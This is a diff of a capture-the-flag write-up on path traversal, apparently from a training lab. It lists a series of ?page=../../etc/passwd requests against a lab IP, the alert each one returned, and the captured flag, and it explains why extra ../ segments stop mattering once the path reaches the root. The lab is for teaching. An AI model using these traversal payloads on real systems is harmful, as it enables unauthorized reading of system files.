@@ -32,19 +32,23 @@ The `../` sequence is a common sequence used by an attacker to access files or t
 * `Relative/Absolute Paths`: Understanding whether the application uses relative or absolute paths for file operations.
 suppose an application uses relative paths for file operations and expects user input like filename.txt. An attacker can manipulate the input to access a file outside the intended directory, e.g., ../../../../../etc/passwd.
 
-**Location:** `page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
+**Location:** `${IP}/?page=`
 
 **Step0**
-in this location, it appears in the location setetd before, could be vulnerable to path traversal attacks if not properly sanitized:
+the url path in the location could be vulnerable to path traversal attacks if not properly sanitized:
 
-we tried : http://10.13.100.74/?page=../../etc/passwd: an alert shows wtf
-we tried : http://10.13.100.74/?page=../.././../../../etc/passwd: an alert shows nope
-we tried : http://10.13.100.74/?page=../../../../../../../../../etc/passwd: an alert shows almost
-we  keep tring : http://10.13.100.74/?page=../../../../../../../../../etc/passwd: teh alert shows now a diffrent message
+we tried : http://10.13.100.74/?page=../../etc/passwd: an alert shows wrong
+we tried : http://10.13.100.74/?page==../../../etc/passwd an alert shows nope
+we tried : http://10.13.100.74/?page==../../../../../etc/passwd: an alert shows still not
+we  keep tring : http://10.13.100.74/?page=../../../../../../../etc/passwd: the alert shows now a diffrent message containig the flag
+we  keep tring : http://10.13.100.74/?page=../../../../../../../../../etc/passwd: the alert shows the same message of the previous try
 
-Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
+`Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`
+
 >NOTE
-> etc/passwd is a common file used to demonstrate directory traversal, as it is often used by crackers to try cracking the passwords.
+> /etc/passwd is a common file used to demonstrate directory traversal, as it is often used by crackers to try cracking the passwords.
+>more of ".." sequences, meaning it goes up multiple directory levels before reaching "etc/passwd". This could potentially traverse through several parent directories before reaching the "etc/passwd" file. 
+>In Unix-like systems, when you traverse up the directory tree using "../", you can't go beyond the root directory. So, adding more "../" sequences beyond reaching the root directory won't change the path.
 
 
 **To prevent**
